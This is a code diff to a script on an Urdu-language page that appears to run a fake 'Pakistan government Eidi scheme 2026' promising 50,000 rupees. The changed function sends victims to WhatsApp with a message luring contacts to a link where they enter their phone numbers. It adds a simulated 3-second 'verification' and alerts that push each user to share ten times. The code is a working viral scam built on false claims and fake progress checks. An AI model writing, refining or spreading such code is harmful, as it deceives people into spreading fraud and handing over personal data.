@@ -81,19 +81,39 @@ function markJoined() {
 }
 
 function shareWa() {
-    shareCount++;
-    if (shareCount > 10) shareCount = 10;
-    
-    const progress = (shareCount / 10) * 100;
-    document.getElementById('shareProgress').style.width = progress + '%';
-    document.getElementById('shareCount').innerText = `${shareCount}/10 تکمیل`;
-    
-    // Dynamic sharing text
+    if (shareCount >= 10) return;
+
+    // Open WhatsApp
     const shareText = encodeURIComponent(`🌙 عید مبارک! ✨ \n\nمجھے پاکستان حکومت کی عیدی اسکیم 2026 سے 50,000 روپے مل رہے ہیں! 😍 \n\nاگر آپ بھی عیدی حاصل کرنا چاہتے ہیں تو ابھی اس لنک پر کلک کریں اور اپنا نمبر درج کریں: \n\nhttps://eidigift2026-pk.vercel.app`);
-    
     window.open(`whatsapp://send?text=${shareText}`, '_blank');
-    
-    checkCompletion();
+
+    // Verification Simulation
+    const shareBtn = document.querySelector('#tasks .btn-primary[onclick="shareWa()"]');
+    const originalText = shareBtn.innerText;
+    shareBtn.disabled = true;
+    shareBtn.innerText = "شیئر کی تصدیق ہو رہی ہے... (Verifying)";
+    shareBtn.style.opacity = "0.7";
+
+    setTimeout(() => {
+        shareCount++;
+        if (shareCount > 10) shareCount = 10;
+        
+        const progress = (shareCount / 10) * 100;
+        document.getElementById('shareProgress').style.width = progress + '%';
+        document.getElementById('shareCount').innerText = `${shareCount}/10 تکمیل`;
+        
+        shareBtn.disabled = false;
+        shareBtn.innerText = originalText;
+        shareBtn.style.opacity = "1";
+        
+        if (shareCount < 10) {
+            alert(`شیئر مکمل ہو گیا! براہ کرم مزید ${10 - shareCount} بار شیئر کریں۔`);
+        } else {
+            alert("مبارک ہو! آپ کا شیئر کرنے والا ٹاسک مکمل ہو گیا ہے۔");
+        }
+        
+        checkCompletion();
+    }, 3000); // 3 seconds verification delay
 }
 
 function checkCompletion() {
